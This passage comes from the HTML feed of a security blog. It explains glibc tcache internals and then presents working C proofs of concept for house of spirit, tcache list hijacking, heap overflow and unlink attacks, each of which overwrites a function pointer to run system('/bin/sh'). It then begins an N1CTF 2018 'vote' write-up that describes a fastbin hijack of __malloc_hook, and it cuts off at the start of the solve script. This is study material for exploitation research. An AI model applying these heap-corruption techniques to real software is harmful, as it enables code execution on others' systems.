class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes = request2size (bytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最大值限制"><a href="#最大值限制" class="headerlink" title="最大值限制"></a>最大值限制</h3><p>在循环处理unsorted bin内存块是，如果达到放入unsorted bin块最大数量时，会立即返回。默认是0，即不存在上限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we've processed as many chunks as we're allowed while</span></span><br><span class="line"><span class="comment"> filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="unsorted-bin处理结束"><a href="#unsorted-bin处理结束" class="headerlink" title="unsorted bin处理结束"></a>unsorted bin处理结束</h3><p>在循环处理unsorted bin内存块后，如果之前曾放入过tcache块，则会取出一个并返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>​</p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h2><p>当tcache存在时，释放堆块没有对堆块的前后堆块进行合法性校验，只需要构造本块对齐就可以成功将任意构造的堆块释放到tcache中，而在申请时，tcache对内部大小合适的堆块也是直接分配的，并且对于在tcache内任意大小的堆块管理方式是一样的，导致常见的house_of_spirit可以延伸到smallbin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">size_t</span> INTERNAL_SIZE_T;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">    INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> fake_chunk_and_more[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">void</span> (* c)(<span class="keyword">char</span> *) ;</span><br><span class="line">    fake_chunk_and_more[<span class="number">5</span>] = (<span class="keyword">size_t</span> )<span class="built_in">puts</span>; <span class="comment">//If a funtion ptr stored here...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This example showcases how the House of Spirit became more powerful "</span> \</span><br><span class="line">            <span class="string">" after the tcache patch\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Filling space at and after the fake chunk with invalid data\n"</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk_and_more, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(fake_chunk_and_more));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Building fake chunk on the stack at %p\n"</span>, (<span class="keyword">void</span> *)fake_chunk_and_more);</span><br><span class="line">    mchunkptr fake_chunk = (mchunkptr)(<span class="keyword">void</span> *)fake_chunk_and_more;</span><br><span class="line">    fake_chunk-&gt;size = <span class="number">0x90</span>;</span><br><span class="line">    <span class="keyword">void</span> *mem = (<span class="keyword">void</span>*)((<span class="keyword">char</span>*)fake_chunk + offsetof(struct malloc_chunk, fd));</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Passed chunk to free, let's make an allocation for the fake size\n"</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    mem2[<span class="number">3</span>] = (<span class="keyword">size_t</span> )system;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x80) returned: %p\n"</span>, mem2);</span><br><span class="line">    c = fake_chunk_and_more[<span class="number">5</span>];  </span><br><span class="line">    (*c)(<span class="string">"/bin/sh"</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tcache链表劫持"><a href="#tcache链表劫持" class="headerlink" title="tcache链表劫持"></a>tcache链表劫持</h2><p>可以发现，tcache链表的插入和摘除方式与fastbin是基本一致的，也同样可以对tcache的链表进行劫持，并且，由于分配内存时对size没有任何校验。因此，比fastbin dup更容易利用。</p>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> *chunksizep(<span class="keyword">void</span> *mem) &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">size_t</span> *)(((<span class="keyword">char</span> *)mem) - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> (* c[<span class="number">6</span>])(<span class="keyword">char</span> *) ;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"If there is a function ptr array here: %p\n"</span>,c);</span><br><span class="line">    c[<span class="number">3</span>] = <span class="built_in">puts</span>;</span><br><span class="line">    <span class="keyword">void</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc a chunk here , %p. then free it\n "</span>,mem);</span><br><span class="line">    tcache_entry *victim = (tcache_entry *)mem;</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    victim-&gt;next = (<span class="keyword">void</span> *)c; </span><br><span class="line">    <span class="keyword">size_t</span> *mem1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc twice,get addr 1: %p,2: %p\n"</span>,mem1,mem2);</span><br><span class="line">    mem2[<span class="number">3</span>] = (<span class="keyword">size_t</span> )system;</span><br><span class="line">    (*c[<span class="number">3</span>])(<span class="string">"/bin/sh"</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>不完全应用于堆溢出，当内存块释放前，size位置被修改为任意包含在tcache范围内时，在释放后都可以被放置在tcache相应位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line"> &#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">size_t</span> *chunksizep(<span class="keyword">void</span> *mem) &#123;</span><br><span class="line">     <span class="keyword">return</span> (<span class="keyword">size_t</span> *)(((<span class="keyword">char</span> *)mem) - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">     <span class="keyword">size_t</span>  *a = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">     <span class="keyword">size_t</span>  *b = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">     <span class="keyword">size_t</span>  *c = <span class="built_in">malloc</span>(<span class="number">0x48</span>);    </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"first , we malloc 3 chunks,1: %p,2: %p,3: %p\n"</span>,a,b,c);</span><br><span class="line">     <span class="keyword">void</span> (* ptr)(<span class="keyword">char</span> *) ;</span><br><span class="line">     *c = <span class="built_in">puts</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"overflow....\n"</span>);</span><br><span class="line">     <span class="built_in">memset</span>(a, <span class="string">'a'</span>, <span class="number">0x48</span>+<span class="number">1</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"free middle of the three\n "</span>);</span><br><span class="line">     <span class="built_in">free</span>(b);</span><br><span class="line">     <span class="keyword">size_t</span> * d = <span class="built_in">malloc</span>(<span class="number">0x58</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"then malloc a bigger chunk:%p\n "</span>,d);</span><br><span class="line">     d[<span class="number">0x58</span>/<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)<span class="number">-1</span>] = system;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"%p,%p"</span>,c,&amp;d[<span class="number">0x58</span>/<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)<span class="number">-1</span>]);</span><br><span class="line">     ptr = *c;</span><br><span class="line">     (*ptr)(<span class="string">"/bin/sh"</span>); </span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>此外，对于small bin大小的堆块，在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted size vs. prev_size"</span>, P, AV);  \</span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;      \</span><br><span class="line">        FD-&gt;bk = BK;      \</span><br><span class="line">        BK-&gt;fd = FD;      \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">      malloc_printerr (check_action,      \</span><br><span class="line">       <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">       P, AV);      \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="line">                <span class="keyword">else</span> &#123;      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="line">                  &#125;      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="line">              &#125;      \</span><br><span class="line">          &#125;      \</span><br><span class="line">      &#125;      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，在tcache满的时候释放几个堆块到small bin中，再将原本的堆块malloc回去，使得tcache为空。再次malloc时，会从smallbin中分配，此时会把刚释放的同等大小堆块移入tcache中，此时会出现unlink。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p><p><a href="http://ftp.gnu.org/gnu/glibc/" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/glibc/</a></p><p>34C3 CTF —— SimpleGC</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;tcache，全称是thread local caching，是libc 2.26版本中新增加的内存管理机制，属于一种缓存机制，处理逻辑位于malloc函数和free函数中，优先级较高，第一次见到这个结构是在34C3 CTF中的SimpleGC一题。&lt;/p&gt;
&lt;h1 id=
      
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="Linux" scheme="http://p4nda.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF 2018 &amp;&amp; 线程堆知识源代码分析</title>
    <link href="http://p4nda.top/2018/03/15/n1ctf2018/"/>
    <id>http://p4nda.top/2018/03/15/n1ctf2018/</id>
    <published>2018-03-15T13:40:25.000Z</published>
    <updated>2018-03-16T14:09:37.778Z</updated>
    
    <content type="html"><![CDATA[<p>Nu1L队组织的一场国际赛，涉及的知识面很广，仅记录PWN题的第一道和第二道。</p><h1 id="vote"><a href="#vote" class="headerlink" title="vote"></a>vote</h1><p>一道比较常规套路的fastbin利用方法，主要涉及的知识是fastbin堆块的劫持。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目是一个投票系统，主要包括5个函数：</p><p><img src="/img/n1ctf2018/1-1.png" alt=""></p><p>涉及的数据结构是投票者的票数和名字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0             8                16                 ...</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| number      |     time       |   name  .........  | </span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>这里的投票函数实现的很诡异，创建了一个新的线程，线程利用一个bss段上的变量传递线程参数，sleep 等待3s开始投票，出现一个问题，当在3s内有另外的投票时，会造成竞争条件，使第一人的票数投到第二人上。</p><p><img src="/img/n1ctf2018/1-2.png" alt=""></p><p><img src="/img/n1ctf2018/1-3.png" alt=""></p><p>说到诡异，这个取消函数就更诡异了，显然里面有一个UAF以及double free漏洞：</p><p><img src="/img/n1ctf2018/1-4.png" alt=""></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>利用UAF漏洞，首先申请一个超过global_max_fast的漏洞，这样在释放时，堆块会放到unsorted bin中，在unsorted bin的组织结构中，堆块的fd、bk指针会填充为main_arena+88这个地址，因而泄露了libc的地址。注意防止释放时被top块合并就好了。</p><h3 id="Fastbin劫持"><a href="#Fastbin劫持" class="headerlink" title="Fastbin劫持"></a>Fastbin劫持</h3><p>同样还是利用UAF漏洞，fastbin是一个单链表结构，当可以控制一个堆块的fd指针的时候基本就可以实现任意地址分配。</p><p>首先，分配两个<strong>大小为0x70</strong> 的堆块，并且顺序释放，这样在fastbin中会形成单链表结构，单链表的第二块指向第一块的堆头。</p><p>这里的一个比较新的点是，这题的数据结构无法直接修改fd指针，但是由于UAF漏洞，当对一个已释放用户投票时，仍然修改了堆块的fd指针，理论上可以指向任意位置。</p><p>这里我选择将fd指针指向原位置+0x20的地址，因为这个地方可以编辑（上一个用户的name字段），因而伪造一个堆块，就可以再将fastbin劫持到其他地方，选择将堆块劫持到 __malloc_hook - 0x23的位置，这个位置是非页对齐的，但是在分配地址时并不检测，而且在libc 2.23库中，此处存在多个libc地址，当非页对齐看时，此处就有一个0x7f，恰好可绕过fastbin的size检测，另外还有一个malloc_assert检测，非常恰巧的一个值。</p><p>当可以控制__malloc_hook，将其覆盖为one_gadget，就可以直接通过malloc新的堆块来得到shell了。</p><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 